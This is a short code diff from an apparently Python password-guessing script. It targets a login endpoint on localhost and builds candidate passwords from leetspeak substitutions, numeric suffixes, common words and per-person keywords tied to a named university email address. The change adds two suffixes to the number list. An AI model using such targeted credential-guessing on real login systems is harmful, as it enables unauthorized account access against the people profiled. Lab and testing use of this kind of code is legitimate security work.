@@ -4,7 +4,7 @@ from itertools import product
 BASE_URL = "http://127.0.0.1:5000/login"
 ESPECIAIS = "@#$&"
 SUBSTITUICOES = {'a': '4', 'e': '3', 'i': '1', 'o': '0', 's': '$'}
-NUMEROS = ['','1','12','123','2024','2025','7','0','00','99','159']
+NUMEROS = ['','1','12','123','2024','2025','7','0','00', '98', '987','99','159']
 PALAVRAS_GENERICAS = ['senha','admin','123456','password','teste','universidade','unidin','sol','amor']
 PALAVRAS_CHAVE_ALVOS = {
     "msilva@universidade.br":  ["mestre","silva","professor","msilva"],
